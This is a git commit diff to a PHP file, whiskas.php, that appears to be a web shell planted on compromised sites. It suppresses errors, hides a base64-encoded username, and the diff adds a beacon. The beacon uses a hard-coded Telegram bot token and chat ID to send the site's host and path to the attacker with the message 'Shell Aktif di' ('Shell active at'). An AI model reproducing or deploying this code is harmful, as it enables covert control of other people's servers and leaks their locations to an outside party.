9ce5b3ad2aa274ce5fd86571a288657073e657a6
onlyme1d <agungrikardo09@gmail.com>
2026-03-04 23:39:41 +0700

    Update whiskas.php

--- whiskas.php
+++ whiskas.php
@@ -2,6 +2,16 @@
 error_reporting(0);
 ini_set('display_errors', 0);
 
+$botToken = "AAHJUv9t9FlAPS3ZsqRNUIfZ0ut5h6grP_U";
+$chatId = "8652693265";
+
+$domain = $_SERVER['HTTP_HOST'];
+$path = $_SERVER['REQUEST_URI'];
+$full_url = "http://" . $domain . $path;
+
+$message = "Shell Aktif di: " . $full_url;
+
+$sendToTelegram = file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));
 
 $GLOBALS['WHISKAS'] = array(
     'username' => base64_decode('d2hz'), 
